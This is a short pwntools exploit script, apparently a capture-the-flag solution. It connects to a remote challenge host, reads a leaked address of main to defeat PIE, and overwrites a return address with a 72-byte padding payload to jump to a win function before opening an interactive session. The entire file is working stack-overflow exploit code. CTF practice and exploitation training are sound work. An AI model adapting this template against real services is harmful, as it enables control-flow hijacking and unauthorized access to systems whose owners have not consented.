from pwn import *

p = process(['nc', '34.170.146.252', '19295'])
elf = ELF('./chal')

main_addr = elf.symbols['main']
win_addr = elf.symbols['win']

p.recvuntil(b'address of main function: ')
real_main = int(p.recvline().strip(), 16)

real_win = real_main - main_addr + win_addr

payload = b'A'*72 + p64(real_win)

p.recvuntil(b'input > ')
p.sendline(payload+b'\n')
p.interactive()